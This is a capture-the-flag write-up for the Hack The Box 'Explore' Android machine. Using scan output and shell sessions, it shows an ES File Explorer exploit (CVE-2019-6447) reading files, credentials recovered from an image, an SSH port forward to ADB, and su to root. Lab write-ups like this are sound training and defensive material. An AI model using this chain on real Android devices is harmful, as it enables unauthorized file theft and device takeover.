## Default Information
IP Address: 10.10.10.247\
OS: Android

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.247    explore.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.247 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-27 10:34:06 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 59777/tcp on 10.10.10.247                                 
Discovered open port 42135/tcp on 10.10.10.247                                 
Discovered open port 46871/tcp on 10.10.10.247                                 
Discovered open port 2222/tcp on 10.10.10.247 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 2222	| SSH | protocol 2.0 | Open |
| 5555	| freeciv | no-response | Open |
| 42135	| http | ES File Explorer Name Response httpd | Open |
| 45145	| unknown | unknown | Open |
| 59777	| http | Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older | Open |

From this output, there are a few interesting ports that are found. 
- Port 2222 is actually our port to the SSH terminal, and is fingerprinted to be ```SSH-2.0-SSH Server - Banana Studio```. 
- Port 5555 was discovered to have been open, which potentially meant that ADB is listening on this port for this machine (ADB is listening on port 5555 by default.)
- Port 42135 is discovered to be open and is running ES File Explorer service. This could potentially be vulnerable to [CVE-2019-6447](https://www.exploit-db.com/exploits/50070)
- Port 45145 is discovered to be open, but it is running some unknown service. Googling this port could not find any known android service as well.
- Port 59777 is discovered to be hosting some Minecraft game server, but no public exploits could be found for it.

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://explore.htb:59777/

```
http://10.10.10.247:59777/bin                  (Status: 301) [Size: 63] [--> /bin/]
http://10.10.10.247:59777/cache                (Status: 301) [Size: 67] [--> /cache/]
http://10.10.10.247:59777/config               (Status: 301) [Size: 69] [--> /config/]
http://10.10.10.247:59777/d                    (Status: 301) [Size: 59] [--> /d/]
http://10.10.10.247:59777/data                 (Status: 301) [Size: 65] [--> /data/]
http://10.10.10.247:59777/dev                  (Status: 301) [Size: 63] [--> /dev/]
http://10.10.10.247:59777/etc                  (Status: 301) [Size: 63] [--> /etc/]
http://10.10.10.247:59777/init                 (Status: 403) [Size: 31]
http://10.10.10.247:59777/lib                  (Status: 301) [Size: 63] [--> /lib/]
http://10.10.10.247:59777/oem                  (Status: 301) [Size: 63] [--> /oem/]
http://10.10.10.247:59777/product              (Status: 301) [Size: 71] [--> /product/]
http://10.10.10.247:59777/proc                 (Status: 301) [Size: 65] [--> /proc/]
http://10.10.10.247:59777/sbin                 (Status: 301) [Size: 65] [--> /sbin/]
http://10.10.10.247:59777/storage              (Status: 301) [Size: 71] [--> /storage/]
http://10.10.10.247:59777/sys                  (Status: 301) [Size: 63] [--> /sys/]
http://10.10.10.247:59777/system               (Status: 301) [Size: 69] [--> /system/]
```
However upon manual inspection, all of these sites redirect to an error FORBIDDEN page, so this is a deadend. However, looking at the endpoints, this port seems to be hosting the directories of the ES File Explorer.

### Exploring port 5555

Using adb, we will try to connect to port 5555 to check if we are able to connect to port 5555 over adb. However, we realized that we are unable to connect to port 5555 as it is not open

```
┌──(kali㉿kali)-[~/Desktop/android-tools]
└─$ ./adb connect 10.10.10.247:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
```

This may possibly be due to the fact that this port is only accessible from the localhost (127.0.0.1).
## Exploit
### CVE-2019-6447
Using the code from [exploitdb](https://www.exploit-db.com/exploits/50070), we will try to exeute the code to obtain the device information.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py getDeviceInfo 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : VMware Virtual Platform
ftpRoot : /sdcard
ftpPort : 3721
```
### Finding creds.jpg
Afterwards, we will try to list all the files but we are unable to find any files of interest. We will move on to list all the images. From here, we found an interesting creds.jpg file which may contain some credentials that we can use.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

Next, we will download the creds.jpg file and convert the downloaded out.dat file into creds.jpg

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg           1 ⨯

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
                                                                                             
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ mv out.dat creds.jpg 
```

Opening the image, we realize that the image file contains a set of credentials.

![Credentials](https://github.com/joelczk/writeups/blob/main/HTB/Images/Explore/credentials.png?raw=true)

### Connecting to port 2222
Using the credentials, we realize that we are able to login to port 2222 as kristi, and upon furthur inspection we discovered that this is an adb shell.
```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ ssh kristi@10.10.10.247 -p 2222
Password authentication
Password: 
:/ $ pwd
/
:/ $ ls
acct                   init.superuser.rc       sbin                      
bin                    init.usb.configfs.rc    sdcard                    
bugreports             init.usb.rc             sepolicy                  
cache                  init.zygote32.rc        storage                   
charger                init.zygote64_32.rc     sys                       
config                 lib                     system                    
d                      mnt                     ueventd.android_x86_64.rc 
data                   odm                     ueventd.rc                
default.prop           oem                     vendor                    
dev                    plat_file_contexts      vendor_file_contexts      
etc                    plat_hwservice_contexts vendor_hwservice_contexts 
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts  
init                   plat_seapp_contexts     vendor_seapp_contexts     
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts   
init.environ.rc        proc                    vndservice_contexts       
init.rc                product                 
```

### Obtaining user flag
We tried finding for the user.txt flag using ```find``` command, but we are unable to find it. After manually looking through the directories, we found the user.txt file in /sdcard directory.

```
:/ $ cd sdcard
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
:/sdcard $ pwd
/sdcard
:/sdcard $ cat user.txt
<Redacted user flag>
```
### Privilege Escalation to root

With reference to this [guide](https://github.com/mubix/post-exploitation-wiki/blob/master/mobile/android.md), let us first check for the permissions of the current user to check if we can upload/download malicious payloads. Unfortuntely, we are unable to upload/download any files.

```
:/ $ pm list permissions | grep "download"                                     
1|:/ $ pm list permissions | grep "upload
```

However, when we are checking for open ports, we realize that port 5555 is open. This was the same as we have speculated earlier that port 5555 is not accessible to the public, but accesible via localhost.

```
1|:/ $ ss -lnpt
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN      0      50           *:2222                     *:*                   users:(("ss",pid=29174,fd=75),("sh",pid=24980,fd=75),("droid.sshserver",pid=3458,fd=75))
LISTEN      0      4            *:5555                     *:*                  
LISTEN      0      8       [::ffff:127.0.0.1]:38647                    *:*                  
LISTEN      0      10           *:42135                    *:*                  
LISTEN      0      50       [::ffff:10.10.10.247]:46871                    *:*                  
LISTEN      0      50           *:59777                    *:*                    
```

Knowing that port 5555 is accessible on the localhost, but not publicly accessible, we would need to find a way to forward the port to our local machine. However since we are able to gain SSH access, we can make use of SSH to forward the port to our local machine. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222
Password authentication
Password: 
:/ $ 
```

Now, we will have to connect to localhost:5555 using adb

```
┌──(kali㉿kali)-[~/Desktop/android-tools]
└─$ ./adb connect localhost:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555
```

However, we do realize that there are more than 1 devices that is running. Hence, we will have to specify the device that we are going to connect to using adb.

```
┌──(kali㉿kali)-[~/Desktop/android-tools]
└─$ ./adb devices                                                                        1 ⨯
List of devices attached
emulator-5554   device
localhost:5555  device

┌──(kali㉿kali)-[~/Desktop/android-tools]
└─$ ./adb -s localhost:5555 shell
x86_64:/ $  
```

However, we are not a root user yet. Hence, we will still have to escalate our privileges using su command.

```
x86_64:/ $ whoami
shell
x86_64:/ $ su root
:/ # whoami
root
```

### Obtaining root flag
Last but not least, let's find the root flag using the ```find``` command.

```
:/ # find / -name "root.txt" 2>/dev/null
/data/root.txt
```

Viewing the files at the directory will then give the root flag.
```
1|:/ # cat /data/root.txt
<Redacted root flag>
```

## Post-exploitation
### Port 5555

Previously, in our exploit we noticed that port 5555 is only accessible via localhost, but accessible via external IP addresses. Let's now take a look at why.

From /sdcard/etc/init.sh file, we can see that connection from localhost at port 5555 will be accepted but connections from other IP addresses on port 5555 will be dropped and so that is why port 5555 can only be accessed via localhost.

```
# Start rules
iptables -A INPUT -p tcp -s localhost --dport 5555 -j ACCEPT
iptables -A INPUT -p tcp --dport 5555 -j DROP
```

### CVE-2019-6447

CVE-2019-6447 is a vulnerability for ES File Explorer that allows remote attackers to read files or execute applications via port 59777.

This happens because ES File Explorer creates a HTTP server at startup, which is hosted at port 59777 which is the port for our ```Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older``` in this machine. The problem is that once port 59777 is opened by ES File Explorer, this port remains publicly accessible and remains open which will then respond to unauthenticated application/JSON commands over HTTP.

Using netstat, we can see that the port 59777 is open and publicly accessible

```
:/ $ netstat -an | grep "59777"                                                
tcp6       0      0 :::59777                :::*                    LISTEN 
```

Using port 59777, we can supply JSON payload to execute arbitary commands to list files/applications/images/videos etc.

![ES File Explorer](https://github.com/joelczk/writeups/blob/main/HTB/Images/Explore/es_file_explorer.png?raw=true)

Additionally, using the file path that we have obtained earlier, we are also able to view the files from port 59777 using any browser, without the need to connect to any internal services such as SSH on the IP address. For example, we are able to view the creds.jpg file from the firefox browser by just going to http://explore.htb:59777/storage/emulated/0/DCIM/creds.jpg in the image below.

![Viewing files from browser](https://github.com/joelczk/writeups/blob/main/HTB/Images/Explore/credentials_port.png?raw=true)

Another interesthing thing to note is that we can actually obtain our user.txt file from the browser as well! However, we are unable to read the root.txt file from the browser. This actually tells us that the exposed port 59777 only allows arbitary read of files with read permissions granted to a normal user, but not arbitary read of files with read permissions granted to superuser (aka our root user).

![Viewing user.txt file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Explore/user_text.png?raw=true)

![Viewing root.txt file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Explore/root_text.png?raw=true)